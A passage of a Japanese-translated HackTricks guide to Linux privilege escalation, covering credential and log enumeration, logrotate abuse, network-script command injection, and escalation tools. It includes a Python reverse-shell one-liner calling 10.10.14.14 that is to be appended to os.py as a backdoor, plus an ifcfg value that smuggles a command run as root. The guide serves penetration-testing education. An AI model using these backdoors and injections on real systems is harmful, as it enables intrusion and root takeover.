for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。これはパスワードを含んでいる可能性のある**複数のファイル**を検索します。\
**もうひとつの興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、これはローカルコンピュータに保存された多くのパスワードを取得するためのオープンソースのアプリケーションで、Windows, Linux & Mac に対応しています。

### Logs

もし logs を読めるなら、その中に**興味深い／機密情報**が含まれている可能性があります。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、**誤設定された**（バックドア入り？）**audit logs** は、この記事で説明されているように audit logs 内に**パスワードを記録**させてしまう可能性があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むための**グループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名または内容に「**password**」という単語を含むファイルや、ログ内のIPやメールアドレス、ハッシュにマッチする正規表現も確認してください。\
ここでこれらすべての方法を列挙するつもりはありませんが、興味があるなら[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし**where** a python スクリプトが実行される場所を把握していて、そのフォルダに**can write inside** または **modify python libraries** できるなら、OS library を改変して backdoor することができます（python スクリプトが実行される場所に書き込みできる場合は、os.py ライブラリをコピー＆ペーストしてください）。

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### logrotate の悪用

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **write permissions** を持つユーザーが特権昇格できる可能性があります。これは、`logrotate` が多くの場合 **root** として実行され、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行させるように操作できるためです。権限は _/var/log_ だけでなく、ログローテーションが適用される任意のディレクトリでも確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用することができます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に似ています。したがって、ログを変更できることが判明した場合は、誰がそれらのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて特権昇格できるか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

もし何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **write** できる、または既存のスクリプトを **adjust** できるなら、あなたの **system is pwned** です。

Network scripts（例えば _ifcg-eth0_）はネットワーク接続に使われます。見た目はまさに .INI ファイルのようです。しかし、これらは Linux 上で Network Manager（dispatcher.d）によって ~sourced~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` 属性が正しく処理されませんでした。**名前に空白があると、システムは空白以降の部分を実行しようとします。** つまり、**最初の空白以降のすべてが root として実行されます。**

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注：Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です（**古典的な Linux サービス管理システム**）。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で `/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **サービス管理** で、サービス管理タスクのための設定ファイルを使用します。Upstart に移行しても、互換レイヤーのため SysVinit スクリプトは Upstart 設定と並行して使われ続けます。

**systemd** は、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供する現代的な初期化・サービスマネージャです。配布パッケージ用に `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` にファイルを整理しており、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして、カーネルの特権機能を userspace の manager に公開します。FD 順序に基づく署名チェックや弱いパスワード方式のような脆弱な manager 認証により、ローカルアプリが manager を偽装して既に root 化されたデバイス上で root に昇格できる場合があります。詳細とエクスプロイト方法は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations は、プロセスのコマンドラインからバイナリパスを抽出して -v 付きで特権コンテキストで実行することができます。たとえば \S を使った permissive なパターンは、書き込み可能な場所（例：/tmp/httpd）に仕掛けられた攻撃者のリスナーにマッチし、root としての実行につながる可能性があります（CWE-426 Untrusted Search Path）。

詳細と他の discovery/monitoring スタックにも適用可能な一般化されたパターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## カーネルのセキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux ローカル privilege escalation ベクターを探す最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙します [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
